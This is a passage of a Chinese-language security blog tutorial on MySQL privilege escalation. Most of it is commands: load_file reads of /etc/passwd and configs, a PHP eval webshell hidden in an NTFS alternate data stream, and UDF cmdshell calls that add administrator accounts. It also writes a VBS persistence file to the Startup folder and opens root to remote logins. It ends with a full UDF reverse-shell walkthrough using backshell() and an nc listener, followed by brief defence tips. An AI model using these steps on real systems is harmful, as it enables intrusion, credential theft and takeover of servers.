查看linux APACHE虚拟主机配置文件</span><br><span class="line">15. /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line">16. /usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line">17. /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line">18. /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line">19. /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line">20. /usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line">21. /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line">22. /etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line">23. load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</span><br><span class="line">24. replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</span><br><span class="line">25. replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br></pre></td></tr></table></figure>
+
+<p><strong>(2)直接读取配置文件</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="string">'/etc/passwd'</span> )</span><br><span class="line"><span class="number">2.</span> <span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="string">'/etc/issues'</span> )</span><br><span class="line"><span class="number">3.</span> <span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="string">'/etc/etc/rc.local'</span> )</span><br><span class="line"><span class="number">4.</span> <span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="string">'/usr/local/apache/conf/httpd.conf'</span> )</span><br><span class="line"><span class="number">5.</span> <span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="string">'/etc/nginx/nginx.conf'</span> )</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywyqkegboj20hv04t74u.jpg" alt></p>
+<p>(3)Linux下通过load_file函数读出来的数据库有可能是hex编码，要正常查看需要使用NotePad将将以上代码全部选中，然后选择插件“Converter”-“HEX-ASCII”进行转换。</p>
+<h3 id="2-Windows下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell"><a href="#2-Windows下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell" class="headerlink" title="2. Windows下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell"></a><strong>2. Windows下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell</strong></h3><p>NTFS中的ADS(交换数据流)可以建立目录，隐藏webshell等等。</p>
+<p><strong>(1) Mysql创建目录</strong></p>
+<p>当MySQL版本较高时，自定义函数的dll需要放在mysql目录下的lib\plugin\。一般普通的脚本是没有在这个文件夹下创建文件夹的权限的。这里可以用到ads来突破：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'xxx'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\mysql\\lib::$INDEX_ALLOCATION'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>会在mysql目录下生成一个lib目录，这样你就可以将你的udf放在这个插件目录下了。</p>
+<p><strong>(2)隐藏webshell</strong></p>
+<p>在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval(request[xxx])? ^&gt;&gt; index.php:a.jpg</span><br></pre></td></tr></table></figure>
+
+<p>这样子就生成了一个不可见的shell <strong>a.jpg</strong>，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个a.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，这样子就可以正常解析我们的一句话了。</p>
+<h3 id="3-有用的一些技巧"><a href="#3-有用的一些技巧" class="headerlink" title="3.有用的一些技巧"></a><strong>3.有用的一些技巧</strong></h3><p><strong>(1)3389端口命令行下获取总结</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. netstat -an |find &quot;3389&quot; 查看3389端口是否开放</span><br><span class="line">2. tasklist /svc | find &quot;TermService&quot; 获取对应TermService的PID号</span><br><span class="line">3. netstat -ano | find &apos;1340&apos; 查看上面获取的PID号对应的TCP端口号</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>netstat -an |find &quot;3389&quot; 查看3389端口是否开放</li>
+<li>tasklist /svc | find &quot;TermService&quot; 获取对应TermService的PID号</li>
+<li>netstat -ano | find &#39;1340&#39; 查看上面获取的PID号对应的TCP端口号</li>
+</ol>
+<p><strong>(2)Windows 2008 Server命令行开启3389</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1</span><br><span class="line">2. wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1</span><br><span class="line">3. reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v</span><br></pre></td></tr></table></figure>
+
+<p><strong>(3)wce64 -w 命令直接获取系统明文登录密码</strong></p>
+<p><strong>(4)在phpinfo中查找SCRIPT_FILENAME关键字获取真实路径</strong></p>
+<p><strong>(5)Linux终端提示符下查看mysql有关信息，ps -ef|grep mysql</strong></p>
+<p><strong>(6)Linux下启动mysql服务: service mysqld start</strong></p>
+<p><strong>(7)Linux下查看mysqld是否启动：ps -el | grep mysqld</strong></p>
+<p><strong>(8)查看mysql在哪里：whereis mysql</strong></p>
+<p><strong>(9)查询运行文件所在路径 which mysql</strong></p>
+<p><strong>(10)udf.dll提权常见函数</strong></p>
+<ul>
+<li>cmdshell 执行cmd;</li>
+<li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li>
+<li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li>
+<li>backshell 反弹Shell;</li>
+<li>ProcessView 枚举系统进程;</li>
+<li>KillProcess 终止指定进程;</li>
+<li>regread 读注册表;</li>
+<li>regwrite 写注册表;</li>
+<li>shut 关机,注销,重启;</li>
+<li>about 说明与帮助函数;</li>
+</ul>
+<p>具体用户示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. select cmdshell(&apos;net user iis_user 123!@#abcABC /add&apos;);</span><br><span class="line">2. select cmdshell(&apos;net localgroup administrators iis_user /add&apos;);</span><br><span class="line">3. select cmdshell(&apos;regedit /s d:web3389.reg&apos;);</span><br><span class="line">4. select cmdshell(&apos;netstat -an&apos;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-一些常见的Mysql命令"><a href="#4-一些常见的Mysql命令" class="headerlink" title="4.一些常见的Mysql命令"></a><strong>4.一些常见的Mysql命令</strong></h3><p><strong>(1)连接到mysql 服务器</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.0.1 -u root -pantian365.com antian365</span><br></pre></td></tr></table></figure>
+
+<p><strong>(2)查看所有数据库</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(3)使用某个数据库</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use testdatabase;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(4)查看数据库中的所有表</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(5)在test数据库下创建一个新的表</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text);</span><br></pre></td></tr></table></figure>
+
+<p><strong>(6)在表中插入内容添加用户命令</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">"set wshshell=createobject (""wscript.shell"" ) "</span> );</span><br><span class="line">2. <span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">"a=wshshell.run (""cmd.exe /c net user 1 1/add"",0) "</span> );</span><br><span class="line">3. <span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">"b=wshshell.run (""cmd.exe /c net localgroup administrators 1 /add"",0) "</span> );</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywzgxony7j20mh087gme.jpg" alt></p>
+<p><strong>(7)查询a表中所有的数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from a ;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(8)导出数据到系统某个目录下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from a into outfile &quot;C:\\Users\\49974\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.vbs&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>被拦截</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywz8xo9n6j211f0emgp4.jpg" alt></p>
+<p><strong>(9)查询数据库数据路径</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@datadir;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(10)查看所有dir路径</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOW VARIABLES WHERE Variable_Name LIKE &quot;%dir&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(11)查看插件路径</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugins%&apos; ;</span><br></pre></td></tr></table></figure>
+
+<p><strong>(12)查询MYSQL安装路径</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir</span><br></pre></td></tr></table></figure>
+
+<p><strong>(13)常用内置函数</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">select</span> <span class="keyword">system_user</span>() 查看系统用户</span><br><span class="line"><span class="number">2.</span> <span class="keyword">select</span> <span class="keyword">current_user</span>() 查询当前用户</span><br><span class="line"><span class="number">3.</span> <span class="keyword">select</span> <span class="keyword">user</span>(); 查询用户</span><br><span class="line">4. <span class="keyword">SELECT</span> <span class="keyword">version</span>() 查询数据库版本</span><br><span class="line"><span class="number">5.</span> <span class="keyword">SELECT</span> <span class="keyword">database</span>() 查询当前连接的数据库</span><br><span class="line"><span class="number">6.</span> <span class="keyword">select</span> @@version_compile_os 查询当前操作系统</span><br><span class="line"><span class="number">7.</span> <span class="keyword">select</span> <span class="keyword">now</span>(); 显示当前时间</span><br></pre></td></tr></table></figure>
+
+<p><strong>(14)获取表结构</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc 表名 或者show columns from 表名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywz1m62f8j20di0373yp.jpg" alt></p>
+<p>(15)删除表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table &lt;表名&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注：本文是笔者撰写的Mysql安全系列文章的第一期，后续我们会持续推出，敬请期待。</p>
+<p>参考文章：</p>
+<p><a href="http://www.jb51.net/hack/41493.html" target="_blank" rel="noopener">http://www.jb51.net/hack/41493.html</a></p>
+<p><a href="http://www.pythian.com/blog/hashing-algorithm-in-mysql-password-2/" target="_blank" rel="noopener">http://www.pythian.com/blog/hashing-algorithm-in-mysql-password-2/</a></p>
+<p><a href="http://www.myhack58.com/Article/html/3/8/2016/75694.htm" target="_blank" rel="noopener">http://www.myhack58.com/Article/html/3/8/2016/75694.htm</a></p>
+<p><a href="http://www.cnblogs.com/hateislove214/archive/2010/11/05/1869889.html" target="_blank" rel="noopener">http://www.cnblogs.com/hateislove214/archive/2010/11/05/1869889.html</a></p>
+<h1 id="0x02-MySQL数据库反弹端口连接提权"><a href="#0x02-MySQL数据库反弹端口连接提权" class="headerlink" title="0x02 MySQL数据库反弹端口连接提权"></a>0x02 MySQL数据库反弹端口连接提权</h1><p>通过mysql查询来直接提权，可以针对以下场景：</p>
+<p>(1)通过网站无法获取webshell</p>
+<p>(2)Webshell无法执行命令</p>
+<p>(3)有phpmyadmin和root账号，无法查询或者无法获取网站的真实路径</p>
+<p>注：本文是笔者撰写的Mysql安全系列文章的第二篇。第一篇为《<a href="http://zhuanlan.51cto.com/art/201702/531259.htm" target="_blank" rel="noopener">关系型数据库管理系统MySQL提权基础</a>》。</p>
+<h2 id="一、反弹端口连接提权的条件"><a href="#一、反弹端口连接提权的条件" class="headerlink" title="一、反弹端口连接提权的条件"></a><strong>一、反弹端口连接提权的条件</strong></h2><p><strong>1.访问Mysql数据库</strong></p>
+<p>获取了数据库root账号和密码或者相当于root权限的账号和密码，同时能够执行查询命令。换句话说可以通过phpmyadmin连接、通过网站后台的执行数据库命令或者“Navicat for MySQL”等客户端软件连接。</p>
+<p><strong>2.可导出文件udf.dll到系统目录或者Mysql数据库安装目录下的lib下的plugin目录。</strong></p>
+<p>如果有上传条件，可以直接上传udf.dll到对应目录。Mysql5.1以下版本到c:\winnt\system32或者c:\windows\system32目录，Mysql5.1以上版本到Mysql安装目录下的plugin 目录，例如D:\ComsenzEXP\MySQL\lib\plugin。</p>
+<p><strong>3.授权mysql数据库远程用户登录</strong></p>
+<p>可以修改host为%，更新权限，然后通过Navicat for MySQL连接数据库，直接打开命令提示窗口进行导出。</p>
+<p>允许远程用户登录访问mysql的方法，需要手动增加可以远程访问数据库的用户。</p>
+<p><strong>方法一：本地登入mysql，更改 &quot;mysql&quot; 数据库里的 &quot;user&quot; 表里的 &quot;host&quot; 项，将&quot;localhost&quot;改为&quot;%&quot;</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">use</span> mysql;</span><br><span class="line">2. <span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> host = <span class="string">'%'</span> <span class="keyword">where</span> <span class="keyword">user</span> = <span class="string">'root'</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span> ;</span><br><span class="line">更改 "mysql" 数据库里的 "user" 表里的 "host" 项，从"localhost"改称"%"</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywy010pekj20dv07gq3m.jpg" alt></p>
+<p><strong>方法二：直接授权</strong></p>
+<p>从任何主机上使用root用户，密码：youpassword(你的root密码)连接到mysql服务器：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'youpassword'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line">2. <span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br><span class="line">如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器，并使用mypassword作为密码</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'myuser'</span>@<span class="string">'192.168.1.3'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'mypassword'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line"><span class="keyword">FLUSH</span>   <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyxvhe97u5j20ze0f3402.jpg" alt></p>
+<p>方法三：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">默认情况下，mysql只允许本地登录，如果要开启远程连接，则需要修改/etc/mysql/my.conf文件。</span><br><span class="line"></span><br><span class="line">一、修改/etc/mysql/my.conf</span><br><span class="line">找到bind-address = 127.0.0.1这一行</span><br><span class="line">改为bind-address = 0.0.0.0即可</span><br><span class="line"></span><br><span class="line">二、为需要远程登录的用户赋予权限</span><br><span class="line">1、新建用户远程连接mysql数据库</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="keyword">admin</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'123456'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line">允许任何ip地址(%表示允许任何ip地址)的电脑用admin帐户和密码(123456)来访问这个mysql server。</span><br><span class="line">注意admin账户不一定要存在。</span><br><span class="line"></span><br><span class="line">2、支持root用户允许远程连接mysql数据库</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'123456'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、具体实现方法"><a href="#二、具体实现方法" class="headerlink" title="二、具体实现方法"></a><strong>二、具体实现方法</strong></h2><h3 id="1-连接mysql服务器"><a href="#1-连接mysql服务器" class="headerlink" title="1.连接mysql服务器"></a><strong>1.连接mysql服务器</strong></h3><p>(1)通过mysql客户端工具可以直接连接</p>
+<p>(2)通过phpmyadmin进行连接</p>
+<p>(3)通过mysql.exe直接连接</p>
+<h3 id="2-执行查询命令"><a href="#2-执行查询命令" class="headerlink" title="2.执行查询命令"></a><strong>2.执行查询命令</strong></h3><p>(1)网上提供的“. c:\mysql.txt”命令会出错，最好通过phpmyadmin或者Navicat for MySQL等工具来进行查询。修改mysql.txt中的最后一行代码“select backshell(&quot;YourIP&quot;,4444);”为自己反弹的IP和反弹监听的端口。</p>
+<p>(2)本地开启监听反弹的端口</p>
+<p>nc.exe -vv -l -p 4444</p>
+<p>(3)执行mysql查询，将mysql.txt文件内容复制到查询中执行。</p>
+<p>成功后，你将获得一个system权限的cmdshell。</p>
+<h3 id="3-添加用户或者获取管理员密码"><a href="#3-添加用户或者获取管理员密码" class="headerlink" title="3.添加用户或者获取管理员密码"></a><strong>3.添加用户或者获取管理员密码</strong></h3><p>通过反弹shell添加用户antian365，密码<a href="http://www.antian365.com" target="_blank" rel="noopener">www.antian365.com</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. net user antian365 www.antian365.com /add</span><br><span class="line">2. net localgroup administrators antian365</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、一个提权实例"><a href="#三、一个提权实例" class="headerlink" title="三、一个提权实例"></a><strong>三、一个提权实例</strong></h2><p><a href="http://s2.51cto.com/wyfs02/M02/8E/0A/wKioL1iz-LfiXi2dAABweJzi7qs564.jpg-wh_651x-s_656932454.jpg" target="_blank" rel="noopener"><img src="http://s2.51cto.com/wyfs02/M02/8E/0A/wKioL1iz-LfiXi2dAABweJzi7qs564.jpg-wh_651x-s_656932454.jpg" alt="图1进行监听"></a></p>
+<h3 id="1-在反弹监听服务器上进行端口监听"><a href="#1-在反弹监听服务器上进行端口监听" class="headerlink" title="1.在反弹监听服务器上进行端口监听"></a><strong>1.在反弹监听服务器上进行端口监听</strong></h3><p>通过cmd命令提示符，执行nc监听命令：nc –vv –l –p 4444，表示在本地监听4444端口。如果是在公网上，这反弹监听服务器必须有独立IP，如果是内部网络，则可以直接使用内网IP，如图1所示。</p>
+<p>图1进行监听</p>
+<h3 id="2-修改mysql-txt文件中反弹地址"><a href="#2-修改mysql-txt文件中反弹地址" class="headerlink" title="2.修改mysql.txt文件中反弹地址"></a><strong>2.修改mysql.txt文件中反弹地址</strong></h3><p>在mysql.txt文件中将最后一行代码修改为前面设置的监听IP地址和端口，如图2所示，例如代码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> backshell(<span class="string">"192.168.40.135"</span>,<span class="number">4444</span>);//反弹监听服务器IP192.168.40.135，端口4444</span><br></pre></td></tr></table></figure>
+
+<p>可修改查询代码中反弹shell地址和端口</p>
+<p>这个也可以再次单独查询：select backshell(&quot;192.168.40.135&quot;,4444);</p>
+<p><strong>3.执行查询</strong></p>
+<p>可以通过mysql命令行下执行，也可以通过phpmyadmin查询窗口以及一些mysql客户端查询进行，如图3所示执行查询。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> mysql;</span><br><span class="line"><span class="keyword">set</span> @a=<span class="keyword">concat</span>(<span class="string">''</span>,<span class="number">0</span>x代码);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Ghost(<span class="keyword">data</span> LONGBLOB);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Ghost <span class="keyword">values</span>(<span class="string">""</span>);<span class="keyword">update</span> Ghost <span class="keyword">set</span> <span class="keyword">data</span> = @a;</span><br><span class="line">代码为<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'c:/udf.dll'</span>))中的内容</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> Ghost <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/phpStudy/MySQL/lib/plugin/udf.dll'</span>; //导出ufd.dll</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> backshell <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'udf.dll'</span>;//创建函数</span><br><span class="line"><span class="keyword">select</span> backshell(<span class="string">"192.168.40.135"</span>,<span class="number">4444</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywr1fgo6xj20dw096jsv.jpg" alt></p>
+<p>说明：</p>
+<p>(1)如果已经存在ghost表和backshell函数，可以执行以下命令进行删除：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">drop</span> <span class="keyword">table</span> ghost;</span><br><span class="line">2. <span class="keyword">drop</span> <span class="keyword">FUNCTION</span> backshell;</span><br></pre></td></tr></table></figure>
+
+<p>(2)如果已经存在udf.dll，则可以跳过导出命令，执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> backshell <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'udf.dll'</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-查看反弹结果"><a href="#3-查看反弹结果" class="headerlink" title="3.查看反弹结果"></a><strong>3.查看反弹结果</strong></h3><p>如图4所示，显示通过连接mysql执行查询获取的终端反弹shell，在该shell下可以直接执行net user、whoami等命令查看当前权限。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywr33kikuj20dw0793zk.jpg" alt></p>
+<h2 id="四、防范方法"><a href="#四、防范方法" class="headerlink" title="四、防范方法"></a><strong>四、防范方法</strong></h2><p>1.查看mysql数据库中user表授权的登录host，禁止具备Root账号权限的用户通过“%”进行登录。</p>
+<p>2.禁止在网站CMS系统使用root账号进行配置。</p>
+<p>3.设置root账号的密码为强密码。</p>
+<p>4.对Mysql执行程序进行降权，禁止网站用户读取user.frm、user.myd、user.myi。例如D:\ComsenzEXP\MySQL\data\mysql下的user表文件user.frm、user.myd、user.myi要禁止网站用户读取和下载。</p>
+<p>5.检查mysql数据库下的mysql表中是否存在其它无关表，检查func表中的内容。</p>
+<p>6.可以在相应的目录下建立一个udf.dll空文件，并严格设置权限，任何人无读取和写入权限。</p>
+<p>注：本文是笔者撰写的Mysql安全系列文章的第二篇，我们将会持续推出后续文章，敬请期待。</p>
+<p>mysql利用ntfs的ADS创建文件夹  <a href="http://blog.csdn.net/yiyefangzhou24/article/details/17190135" target="_blank" rel="noopener">http://blog.csdn.net/yiyefangzhou24/article/details/17190135</a><br>MYSQL提权总结   <a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390" target="_blank" rel="noopener">http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390</a></p>
+<p>phpmyadmin直接提权 <a href="http://www.hack80.com/forum.php?mod=viewthread&amp;tid=1304" target="_blank" rel="noopener">http://www.hack80.com/forum.php?mod=viewthread&amp;tid=1304</a></p>
+<p>通过phpmyadmin各种技巧拿webshell  <a href="https://www.exehack.net/99.html" target="_blank" rel="noopener">https://www.exehack.net/99.html</a></p>
+<h1 id="0x03-实例解析：MySQL数据库扩展接口UDF提权"><a href="#0x03-实例解析：MySQL数据库扩展接口UDF提权" class="headerlink" title="0x03 实例解析：MySQL数据库扩展接口UDF提权"></a>0x03 实例解析：MySQL数据库扩展接口UDF提权</h1><h2 id="一、UDF函数简介"><a href="#一、UDF函数简介" class="headerlink" title="一、UDF函数简介"></a><strong>一、UDF函数简介</strong></h2><h3 id="1-UDF介绍"><a href="#1-UDF介绍" class="headerlink" title="1.UDF介绍"></a><strong>1.UDF介绍</strong></h3><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。UDF官方介绍以及其函数定义请参考（<a href="http://dev.mysql.com/doc/refman/5.5/en/adding-functions.html、https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html），除了常见的UDF提权外，其实Udf还有更多更广泛的应用，例如https://github.com/mysqludf/repositories，就提供了非常多的应用：" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.5/en/adding-functions.html、https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html），除了常见的UDF提权外，其实Udf还有更多更广泛的应用，例如https://github.com/mysqludf/repositories，就提供了非常多的应用：</a></p>
+<blockquote>
+<p>lib_mysqludf_fPROJ4：一组扩展的科学函数，将地理经度和纬度坐标转换为笛卡尔坐标，反之亦然。</p>
+<p>lib_mysqludf_json：用于将关系数据映射到JSON格式的函数的UDF库。</p>
